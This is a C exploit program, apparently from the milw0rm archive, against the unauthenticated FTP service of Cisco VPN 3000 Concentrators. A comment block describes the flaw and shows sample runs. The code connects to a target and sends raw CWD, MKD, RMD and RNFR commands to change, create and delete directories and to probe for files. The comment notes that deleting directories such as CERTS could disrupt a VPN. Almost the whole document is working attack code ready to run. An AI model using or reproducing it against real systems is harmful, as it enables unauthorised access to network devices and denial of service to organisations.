<html><head><title>Cisco VPN 3000 Concentrator <= 4.1.7, 4.7.2 (FTP) Remote Exploit</title></head><pre>/* Cisco VPN Concentrator 3000 FTP remote exploit
 * ==============================================
 * A vulnerability exists in the Cisco VPN Concentrator 3000,
 * an unauthenticated user may access the file system through
 * manipulation of FTP service commands. An unauthenticated 
 * user can use the following commands;
 * 
 * CWD  - Change the current working directory
 * MKD  - Make a directory within the current working directory
 * CDUP - Change directory up one tree.
 * RNFR - Rename From (This can be used to identify files and directories)
 * SIZE - This can be used to identify files and directories
 * RMD  - This can be used to delete a directory
 *
 * The FTP service remembers the current working directory so directory
 * changes can affect exploitation. By removing potentially sensitive
 * directories such as &quot;CERTS&quot; it may be possible to disrupt service
 * to a VPN.
 * 
 * Confirmed Vulnerable
 * + Cisco Systems Inc./VPN 3000 concentrator Version 4.1.5 RelJun 18 2004
 * 
 * Example.
 * localhost exploits # ./prdelka-vs-CISCO-vpnftp -s 10.1.2.10 -c / 
 * [ Cisco VPN Concentrator 3000 FTP service exploit
 * [ Connected to 10.1.2.10 (21/tcp)
 * [ Changing directory to /
 * [ Success! changed directory to /
 * localhost exploits # ./prdelka-vs-CISCO-vpnftp -s 10.1.2.10 -t config
 * [ Cisco VPN Concentrator 3000 FTP service exploit
 * [ Connected to 10.1.2.10 (21/tcp)
 * [ Testing for the existance of config
 * [ Success! file config does exist!
 * 
 * 
 * - prdelka
 */
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;getopt.h&gt;
#include &lt;signal.h&gt;

int main (int argc, char *argv[]){
	int ihost=0,index=0,imkdir=0,ichdir=0,idelete=0,itest=0,ipass=0,port=21;
	int c, sd, rc, size;
	char *host, *directory, *file, *buffer, *rbuffer;
	struct sockaddr_in servAddr;
	struct hostent *h;
        static struct option options[]={
                {&quot;server&quot;, 1, 0, 's'},
                {&quot;port&quot;, 1, 0, 'p'},
                {&quot;rmdir&quot;, 1, 0, 'r'},
                {&quot;mkdir&quot;, 1, 0, 'm'},
                {&quot;chdir&quot;, 1, 0, 'c'},
		{&quot;test&quot;, 1, 0, 't'},
                {&quot;help&quot;, 0, 0,'h'}
        };
	printf(&quot;[ Cisco VPN Concentrator 3000 FTP service exploit\n&quot;);
        while(c != -1){
                c = getopt_long(argc,argv,&quot;s:p:r:m:c:t:h&quot;,options,&amp;index);
                switch(c){
                        case 's':
                                if(ihost==0){
	                                h = gethostbyname(optarg);
        	                        if(h==NULL){
                	                        printf(&quot;[ Error unknown host '%s'\n&quot;,optarg);
                        	                exit(1);
                                	}
	                                host = malloc(strlen(optarg) + 1);
        	                        sprintf(host,&quot;%s&quot;,optarg);
                	                ihost = 1;
                                }                               
				break;
			case 'p':
				port = atoi(optarg);
				break;
			case 'r':
				if(idelete==0){
					if(ipass!=1){
						ipass = 1;
						idelete = 1;
						directory = optarg;
					}
					else{
						printf(&quot;[ Error: cannot delete directory as another option already selected\n&quot;);
						exit(1);
					}
				}
				break;
			case 'c':
				if(ichdir==0){
					if(ipass!=1){
						ipass = 1;
						ichdir = 1;
						directory = optarg;
					}
					else{
						printf(&quot;[ Error: cannot change dir as another option already selected\n&quot;);
						exit(2);
					}
				}
				break;
			case 't':
				if(itest==0){
					if(ipass!=1){
						ipass = 1;
						itest = 1;
						file = optarg;
					}
					else{
						printf(&quot;[ Error: cannot test for existance as another option already selected\n&quot;);
						exit(3);
					}					
				}
				break;
			case 'm':
				if(imkdir==0){
					if(ipass!=1){
						ipass = 1;
						imkdir = 1;
						directory = optarg;
					}
					else{
						printf(&quot;[ Error: cannot make directory as another option already selected\n&quot;);
						exit(4);
					}
					
				}
				break;
			case 'h':
				printf(&quot;[ Usage instructions.\n[\n&quot;);
				printf(&quot;[ %s &lt;required&gt; (optional)\n[\n&quot;,argv[0]);
				printf(&quot;[\t--server|-s &lt;ip/hostname&gt;\n[\t--port|-p (port) [default 21]\n[\t--rmdir|-r (directory)\n[\t--mkdir|-m (directory)\n&quot;);
				printf(&quot;[\t--chdir|-c (directory)\n[\t--test|-t (filename/directory)\n[\n&quot;);
				exit(0);
				break;
			default:
				break;
		}
	}
        if(ihost  != 1 || ipass != 1){
        	printf(&quot;[ Error insufficient arguements, try running '%s --help'\n&quot;,argv[0]);
	        exit(1);
        }
        servAddr.sin_family = h-&gt;h_addrtype;
        memcpy((char *) &amp;servAddr.sin_addr.s_addr, h-&gt;h_addr_list[0], h-&gt;h_length);
        servAddr.sin_port = htons(port);
        sd = socket(AF_INET, SOCK_STREAM, 0);
        if(sd&lt;0){
                printf(&quot;[ Cannot open socket\n&quot;);
                exit(1);
        }
        rc = connect(sd, (struct sockaddr *) &amp;servAddr, sizeof(servAddr));
        if(rc&lt;0){
                printf(&quot;[ Cannot connect\n&quot;);
                exit(1);
        }
        printf(&quot;[ Connected to %s (%d/tcp)\n&quot;,host,port);
	rbuffer = malloc(1024);
	if(ichdir==1){
		printf(&quot;[ Changing directory to %s\n&quot;,directory);
		size = 2048 + strlen(directory);
		buffer = malloc(size);
		sprintf(buffer,&quot;CWD %s\r\n&quot;,directory);
		rc = send(sd, buffer, strlen(buffer),0);
                while((rc = recv(sd, rbuffer,1023,0)) != -1){
                        rbuffer[rc]=0;
                        if(strstr(rbuffer,&quot;250 Changed to .&quot;) != NULL){
                                printf(&quot;[ Success! changed directory to %s\n&quot;,directory);
                                break;
                        }
                        if(strstr(rbuffer,&quot;530 Can't change directory to&quot;) != NULL){
                                printf(&quot;[ Error! cannot set current directory to %s\n&quot;,directory);
                                exit(-1);
                        }
                }
	}
	if(imkdir==1){
		printf(&quot;[ Making directory %s\n&quot;,directory);
		size = 2048 + strlen(directory);
		buffer = malloc(size);
		sprintf(buffer,&quot;MKD %s\r\n&quot;,directory);
		rc = send(sd, buffer, strlen(buffer),0);
		while((rc = recv(sd, rbuffer,1023,0)) != -1){
			rbuffer[rc]=0;
			if(strstr(rbuffer,&quot;257 MKD command successful.&quot;) != NULL){
				printf(&quot;[ Success! directory %s created\n&quot;,directory);
				break;
			}
		}
	}
	if(idelete==1){
		printf(&quot;[ Deleting directory %s\n&quot;,directory);
		size = 2048 + strlen(directory);
		buffer = malloc(size);
		sprintf(buffer,&quot;RMD %s\r\n&quot;,directory);
		rc = send(sd, buffer, strlen(buffer),0);
                while((rc = recv(sd, rbuffer,1023,0)) != -1){
                        rbuffer[rc]=0;
                        if(strstr(rbuffer,&quot;250 RMD command successful.&quot;) != NULL){
                                printf(&quot;[ Success! directory %s deleted\n&quot;,directory);
                                break;
                        }
                }
	}
	if(itest==1){
		printf(&quot;[ Testing for the existance of %s\n&quot;,file);
		size = 2048 + strlen(file);
		buffer = malloc(size);
		sprintf(buffer,&quot;RNFR %s\r\n&quot;,file);
		rc = send(sd, buffer,strlen(buffer),0);		
                while((rc = recv(sd, rbuffer,1023,0)) != -1){			
                	rbuffer[rc]=0;		
                        if(strstr(rbuffer,&quot;350 RNFR accepted - file exists, ready for destination.&quot;) != NULL){
                                printf(&quot;[ Success! %s does exist!\n&quot;,file);
                                break;
                        }
                        if(strstr(rbuffer,&quot;550 File does not exist!&quot;) != NULL){
                                printf(&quot;[ Success! %s does not exist\n&quot;,file);
                                break;
                        }
                }
	}
	exit(0);
}

// milw0rm.com [2006-10-24]</pre></html>